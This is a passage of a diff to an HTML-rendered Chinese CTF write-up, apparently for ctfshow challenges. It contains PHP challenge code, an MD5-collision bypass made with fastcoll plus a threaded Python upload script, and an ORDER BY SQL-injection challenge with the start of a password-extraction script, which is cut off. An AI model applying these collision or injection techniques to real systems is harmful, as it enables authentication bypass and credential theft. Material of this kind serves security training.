-<span id="cb30-17"><a href="#cb30-17" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb30-18"><a href="#cb30-18" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb30-19"><a href="#cb30-19" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="fu">md5</span>(<span class="fu">date</span>(<span class="st">&quot;i&quot;</span>)) <span class="op">===</span> <span class="va">$token</span>)&#123;</span>
-<span id="cb30-20"><a href="#cb30-20" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb30-21"><a href="#cb30-21" aria-hidden="true" tabindex="-1"></a><span class="va">$receiveFile</span> <span class="op">=</span> <span class="st">&#39;flag.dat&#39;</span><span class="ot">;</span></span>
-<span id="cb30-22"><a href="#cb30-22" aria-hidden="true" tabindex="-1"></a>receiveStreamFile(<span class="va">$receiveFile</span>)<span class="ot">;</span></span>
-<span id="cb30-23"><a href="#cb30-23" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="fu">md5_file</span>(<span class="va">$receiveFile</span>)<span class="op">===</span><span class="fu">md5_file</span>(<span class="st">&quot;key.dat&quot;</span>))&#123;</span>
-<span id="cb30-24"><a href="#cb30-24" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="fu">hash_file</span>(<span class="st">&quot;sha512&quot;</span><span class="ot">,</span><span class="va">$receiveFile</span>)<span class="op">!=</span><span class="fu">hash_file</span>(<span class="st">&quot;sha512&quot;</span><span class="ot">,</span><span class="st">&quot;key.dat&quot;</span>))&#123;</span>
-<span id="cb30-25"><a href="#cb30-25" aria-hidden="true" tabindex="-1"></a><span class="va">$ret</span>[<span class="st">&#39;success&#39;</span>]<span class="op">=</span><span class="st">&quot;1&quot;</span><span class="ot">;</span></span>
-<span id="cb30-26"><a href="#cb30-26" aria-hidden="true" tabindex="-1"></a><span class="va">$ret</span>[<span class="st">&#39;msg&#39;</span>]<span class="op">=</span><span class="st">&quot;人脸识别成功!</span><span class="va">$flag</span><span class="st">&quot;</span><span class="ot">;</span></span>
-<span id="cb30-27"><a href="#cb30-27" aria-hidden="true" tabindex="-1"></a><span class="va">$ret</span>[<span class="st">&#39;error&#39;</span>]<span class="op">=</span><span class="st">&quot;0&quot;</span><span class="ot">;</span></span>
-<span id="cb30-28"><a href="#cb30-28" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="fu">json_encode</span>(<span class="va">$ret</span>)<span class="ot">;</span></span>
-<span id="cb30-29"><a href="#cb30-29" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span><span class="ot">;</span></span>
-<span id="cb30-30"><a href="#cb30-30" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb30-31"><a href="#cb30-31" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb30-32"><a href="#cb30-32" aria-hidden="true" tabindex="-1"></a><span class="va">$ret</span>[<span class="st">&#39;errormsg&#39;</span>]<span class="op">=</span><span class="st">&quot;same file&quot;</span><span class="ot">;</span></span>
-<span id="cb30-33"><a href="#cb30-33" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="fu">json_encode</span>(<span class="va">$ret</span>)<span class="ot">;</span></span>
-<span id="cb30-34"><a href="#cb30-34" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span><span class="ot">;</span></span>
-<span id="cb30-35"><a href="#cb30-35" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb30-36"><a href="#cb30-36" aria-hidden="true" tabindex="-1"></a><span class="va">$ret</span>[<span class="st">&#39;errormsg&#39;</span>]<span class="op">=</span><span class="st">&quot;md5 error&quot;</span><span class="ot">;</span></span>
-<span id="cb30-37"><a href="#cb30-37" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="fu">json_encode</span>(<span class="va">$ret</span>)<span class="ot">;</span></span>
-<span id="cb30-38"><a href="#cb30-38" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span><span class="ot">;</span></span>
-<span id="cb30-39"><a href="#cb30-39" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb30-40"><a href="#cb30-40" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb30-41"><a href="#cb30-41" aria-hidden="true" tabindex="-1"></a><span class="va">$ret</span>[<span class="st">&#39;errormsg&#39;</span>]<span class="op">=</span><span class="st">&quot;token error&quot;</span><span class="ot">;</span></span>
-<span id="cb30-42"><a href="#cb30-42" aria-hidden="true" tabindex="-1"></a><span class="kw">echo</span> <span class="fu">json_encode</span>(<span class="va">$ret</span>)<span class="ot">;</span></span>
-<span id="cb30-43"><a href="#cb30-43" aria-hidden="true" tabindex="-1"></a><span class="cf">return</span><span class="ot">;</span></span>
-<span id="cb30-44"><a href="#cb30-44" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">function</span> <span class="token function-definition function">receiveStreamFile</span><span class="token punctuation">(</span><span class="token variable">$receiveFile</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+<span class="token variable">$streamData</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_RAW_POST_DATA'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_RAW_POST_DATA'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$streamData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$streamData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php://input'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$streamData</span><span class="token operator">!=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$receiveFile</span><span class="token punctuation">,</span> <span class="token variable">$streamData</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$ret</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">return</span> <span class="token variable">$ret</span><span class="token punctuation">;</span>
+
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+
+<span class="token variable">$receiveFile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'flag.dat'</span><span class="token punctuation">;</span>
+<span class="token function">receiveStreamFile</span><span class="token punctuation">(</span><span class="token variable">$receiveFile</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token variable">$receiveFile</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"key.dat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sha512"</span><span class="token punctuation">,</span><span class="token variable">$receiveFile</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token function">hash_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sha512"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"key.dat"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'success'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>
+<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"人脸识别成功!<span class="token interpolation"><span class="token variable">$flag</span></span>"</span><span class="token punctuation">;</span>
+<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'errormsg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"same file"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'errormsg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"md5 error"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token variable">$ret</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'errormsg'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string double-quoted-string">"token error"</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$ret</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">return</span><span class="token punctuation">;</span>
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>解析：</strong></p>
 <p>发现这里是和key.dat文件进行强碰撞（内容不一样，但是两个文件的md5值相同，同时sha1值不相同）
 key.dat文件key直接进行下载
 借助工具：fastcoll_v1.0.0.5.exe生成两个md5值相同的文件。fastcoll_v1.0.0.5.exe
 -p key.dat -o 1.dat 2.dat</p></li>
 <li><p>python上传两个文件</p>
-<div class="sourceCode" id="cb31"><pre
-class="sourceCode python"><code class="sourceCode python"><span id="cb31-1"><a href="#cb31-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
-<span id="cb31-2"><a href="#cb31-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> time</span>
-<span id="cb31-3"><a href="#cb31-3" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> hashlib</span>
-<span id="cb31-4"><a href="#cb31-4" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> threading</span>
-<span id="cb31-5"><a href="#cb31-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb31-6"><a href="#cb31-6" aria-hidden="true" tabindex="-1"></a><span class="kw">def</span> post(data):</span>
-<span id="cb31-7"><a href="#cb31-7" aria-hidden="true" tabindex="-1"></a>  <span class="cf">try</span>:</span>
-<span id="cb31-8"><a href="#cb31-8" aria-hidden="true" tabindex="-1"></a>      r<span class="op">=</span>requests.post(url,data<span class="op">=</span>data)</span>
-<span id="cb31-9"><a href="#cb31-9" aria-hidden="true" tabindex="-1"></a>      <span class="cf">if</span> <span class="st">&quot;ctfshow&quot;</span> <span class="kw">in</span> r.text:</span>
-<span id="cb31-10"><a href="#cb31-10" aria-hidden="true" tabindex="-1"></a>          <span class="bu">print</span>(r.text)</span>
-<span id="cb31-11"><a href="#cb31-11" aria-hidden="true" tabindex="-1"></a>  <span class="cf">except</span> <span class="pp">Exception</span> <span class="im">as</span> e:</span>
-<span id="cb31-12"><a href="#cb31-12" aria-hidden="true" tabindex="-1"></a>      <span class="cf">pass</span></span>
-<span id="cb31-13"><a href="#cb31-13" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb31-14"><a href="#cb31-14" aria-hidden="true" tabindex="-1"></a>mi<span class="op">=</span><span class="bu">str</span>(time.localtime().tm_min)</span>
-<span id="cb31-15"><a href="#cb31-15" aria-hidden="true" tabindex="-1"></a>m<span class="op">=</span>hashlib.md5(mi.encode()).hexdigest()</span>
-<span id="cb31-16"><a href="#cb31-16" aria-hidden="true" tabindex="-1"></a>url<span class="op">=</span><span class="st">&#39;http://ce61acc9-c947-4ac4-9d2c-3b81b8708df5.challenge.ctf.show:8080/check.php?token=</span><span class="sc">&#123;&#125;</span><span class="st">&amp;php://input&#39;</span>.<span class="bu">format</span>(m)</span>
-<span id="cb31-17"><a href="#cb31-17" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;key.dat&#39;</span>,<span class="st">&#39;rb&#39;</span>) <span class="im">as</span> f:</span>
-<span id="cb31-18"><a href="#cb31-18" aria-hidden="true" tabindex="-1"></a>    data1<span class="op">=</span>f.read()</span>
-<span id="cb31-19"><a href="#cb31-19" aria-hidden="true" tabindex="-1"></a><span class="cf">with</span> <span class="bu">open</span>(<span class="st">&#39;2.dat&#39;</span>,<span class="st">&#39;rb&#39;</span>) <span class="im">as</span> f:</span>
-<span id="cb31-20"><a href="#cb31-20" aria-hidden="true" tabindex="-1"></a>    data2<span class="op">=</span>f.read()</span>
-<span id="cb31-21"><a href="#cb31-21" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">30</span>):</span>
-<span id="cb31-22"><a href="#cb31-22" aria-hidden="true" tabindex="-1"></a>  threading.Thread(target<span class="op">=</span>post,args<span class="op">=</span>(data1,)).start()</span>
-<span id="cb31-23"><a href="#cb31-23" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">30</span>):</span>
-<span id="cb31-24"><a href="#cb31-24" aria-hidden="true" tabindex="-1"></a>  threading.Thread(target<span class="op">=</span>post,args<span class="op">=</span>(data2,)).start()</span></code></pre></div></li>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<span class="token keyword">import</span> time
+<span class="token keyword">import</span> hashlib
+<span class="token keyword">import</span> threading
+
+<span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
+	<span class="token keyword">try</span><span class="token punctuation">:</span>
+		r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>
+		<span class="token keyword">if</span> <span class="token string">"ctfshow"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
+			<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
+	<span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
+		<span class="token keyword">pass</span>
+
+mi<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>tm_min<span class="token punctuation">)</span>
+m<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span>mi<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
+url<span class="token operator">=</span><span class="token string">'http://ce61acc9-c947-4ac4-9d2c-3b81b8708df5.challenge.ctf.show:8080/check.php?token=&#123;&#125;&amp;php://input'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'key.dat'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    data1<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'2.dat'</span><span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
+    data2<span class="token operator">=</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>post<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>data1<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+	threading<span class="token punctuation">.</span>Thread<span class="token punctuation">(</span>target<span class="token operator">=</span>post<span class="token punctuation">,</span>args<span class="token operator">=</span><span class="token punctuation">(</span>data2<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
 <li><p>最终失败</p></li>
 </ol></li>
 </ol>
@@ -1439,72 +1415,70 @@ alt="image-20230525014011115" /></p></li>
 <p><strong>login.php</strong>；发现<code>pwd</code>字段<img
 src="https://s2.loli.net/2023/05/25/kJTzrK7ifj9RHUv.png"
 alt="login.php" /></p>
-<div class="sourceCode" id="cb32"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb32-1"><a href="#cb32-1" aria-hidden="true" tabindex="-1"></a><span class="co">// user_main.php</span></span>
-<span id="cb32-2"><a href="#cb32-2" aria-hidden="true" tabindex="-1"></a><span class="op">&lt;</span><span class="ot">?</span>php</span>
-<span id="cb32-3"><a href="#cb32-3" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb32-4"><a href="#cb32-4" aria-hidden="true" tabindex="-1"></a> <span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$_SESSION</span>[<span class="st">&quot;login&quot;</span>]) <span class="op">&amp;&amp;</span> <span class="va">$_SESSION</span>[<span class="st">&quot;login&quot;</span>] <span class="op">===</span> <span class="kw">true</span>)&#123;</span>
-<span id="cb32-5"><a href="#cb32-5" aria-hidden="true" tabindex="-1"></a>     <span class="va">$con</span> <span class="op">=</span> <span class="fu">mysqli_connect</span>(<span class="st">&quot;localhost&quot;</span><span class="ot">,</span><span class="st">&quot;root&quot;</span><span class="ot">,</span><span class="st">&quot;root&quot;</span><span class="ot">,</span><span class="st">&quot;web15&quot;</span>)<span class="ot">;</span></span>
-<span id="cb32-6"><a href="#cb32-6" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> (<span class="op">!</span><span class="va">$con</span>)</span>
-<span id="cb32-7"><a href="#cb32-7" aria-hidden="true" tabindex="-1"></a>        &#123;</span>
-<span id="cb32-8"><a href="#cb32-8" aria-hidden="true" tabindex="-1"></a>            <span class="cf">die</span>(<span class="st">&#39;Could not connect: &#39;</span> <span class="op">.</span> <span class="fu">mysqli_error</span>())<span class="ot">;</span></span>
-<span id="cb32-9"><a href="#cb32-9" aria-hidden="true" tabindex="-1"></a>        &#125;</span>
-<span id="cb32-10"><a href="#cb32-10" aria-hidden="true" tabindex="-1"></a>     <span class="va">$order</span><span class="op">=</span><span class="va">$_GET</span>[<span class="st">&#39;order&#39;</span>]<span class="ot">;</span></span>
-<span id="cb32-11"><a href="#cb32-11" aria-hidden="true" tabindex="-1"></a>     <span class="cf">if</span>(<span class="kw">isset</span>(<span class="va">$order</span>) <span class="op">&amp;&amp;</span> <span class="fu">strlen</span>(<span class="va">$order</span>)<span class="op">&lt;</span><span class="dv">6</span>)&#123;</span>
-<span id="cb32-12"><a href="#cb32-12" aria-hidden="true" tabindex="-1"></a>         <span class="cf">if</span>(<span class="fu">preg_match</span>(<span class="st">&quot;/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\&#39;|\’|\“|</span><span class="sc">\&quot;</span><span class="st">|\&lt;|\&gt;|\?|\,|\.|\?/i&quot;</span><span class="ot">,</span><span class="va">$order</span>))&#123;</span>
-<span id="cb32-13"><a href="#cb32-13" aria-hidden="true" tabindex="-1"></a>             <span class="cf">die</span>(<span class="st">&quot;error&quot;</span>)<span class="ot">;</span></span>
-<span id="cb32-14"><a href="#cb32-14" aria-hidden="true" tabindex="-1"></a>         &#125;</span>
-<span id="cb32-15"><a href="#cb32-15" aria-hidden="true" tabindex="-1"></a>         <span class="va">$sql</span><span class="op">=</span><span class="st">&quot;select * from user order by </span><span class="va">$order</span><span class="st">&quot;</span><span class="ot">;</span></span>
-<span id="cb32-16"><a href="#cb32-16" aria-hidden="true" tabindex="-1"></a>        &#125;<span class="cf">else</span>&#123;</span>
-<span id="cb32-17"><a href="#cb32-17" aria-hidden="true" tabindex="-1"></a>            <span class="va">$sql</span><span class="op">=</span><span class="st">&quot;select * from user order by id&quot;</span><span class="ot">;</span></span>
-<span id="cb32-18"><a href="#cb32-18" aria-hidden="true" tabindex="-1"></a>        &#125;   </span>
-<span id="cb32-19"><a href="#cb32-19" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb32-20"><a href="#cb32-20" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">// user_main.php
+<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+	
+	<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"login"</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+		<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"web15"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
+        <span class="token punctuation">&#123;</span>
+            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Could not connect: '</span> <span class="token operator">.</span> <span class="token function">mysqli_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+		<span class="token variable">$order</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'order'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+			<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/group|union|select|from|or|and|regexp|substr|like|create|drop|\,|\`|\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\+|\=|\&#123;|\&#125;|\[|\]|\;|\:|\'|\’|\“|\"|\&lt;|\>|\?|\,|\.|\?/i"</span><span class="token punctuation">,</span><span class="token variable">$order</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+				<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token punctuation">&#125;</span>
+			<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user order by <span class="token interpolation"><span class="token variable">$order</span></span>"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">"select * from user order by id"</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>   
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p><strong>解析：</strong></p>
 <p><code>$order=$_GET['order'];</code>：get <code>order</code></p>
 <p><code>$sql="select * from user order by $order";</code>：关键代码</p>
 <p>使
 <code>order = pwd</code>,从题目提示中了解到：flag在指定用户的密码中。</p></li>
 <li><p>Python脚本</p>
-<div class="sourceCode" id="cb33"><pre
-class="sourceCode python"><code class="sourceCode python"><span id="cb33-1"><a href="#cb33-1" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> requests</span>
-<span id="cb33-2"><a href="#cb33-2" aria-hidden="true" tabindex="-1"></a>url <span class="op">=</span> <span class="st">&quot;http://410bc6b8-0a07-434c-bb4f-c8b9501b06e6.challenge.ctf.show/&quot;</span></span>
-<span id="cb33-3"><a href="#cb33-3" aria-hidden="true" tabindex="-1"></a>url1 <span class="op">=</span> url<span class="op">+</span><span class="st">&quot;/reg.php&quot;</span>  <span class="co"># 注册页面</span></span>
-<span id="cb33-4"><a href="#cb33-4" aria-hidden="true" tabindex="-1"></a>url2 <span class="op">=</span> url<span class="op">+</span><span class="st">&quot;/login.php&quot;</span>  <span class="co"># 登录界面</span></span>
-<span id="cb33-5"><a href="#cb33-5" aria-hidden="true" tabindex="-1"></a>url3 <span class="op">=</span> url<span class="op">+</span><span class="st">&quot;/user_main.php?order=pwd&quot;</span>  <span class="co"># 查询界面</span></span>
-<span id="cb33-6"><a href="#cb33-6" aria-hidden="true" tabindex="-1"></a>k <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
-<span id="cb33-7"><a href="#cb33-7" aria-hidden="true" tabindex="-1"></a>s <span class="op">=</span> <span class="st">&quot;-.0123456789:abcdefghijklmnopqrstuvwxyz&#123;|&#125;~&quot;</span></span>
-<span id="cb33-8"><a href="#cb33-8" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> j <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">0</span>, <span class="dv">45</span>):</span>
-<span id="cb33-9"><a href="#cb33-9" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(<span class="st">&quot;*&quot;</span>)</span>
-<span id="cb33-10"><a href="#cb33-10" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> i <span class="kw">in</span> s:</span>
-<span id="cb33-11"><a href="#cb33-11" aria-hidden="true" tabindex="-1"></a>        <span class="co"># print(i)</span></span>
-<span id="cb33-12"><a href="#cb33-12" aria-hidden="true" tabindex="-1"></a>        l <span class="op">=</span> <span class="st">&quot;&quot;</span></span>
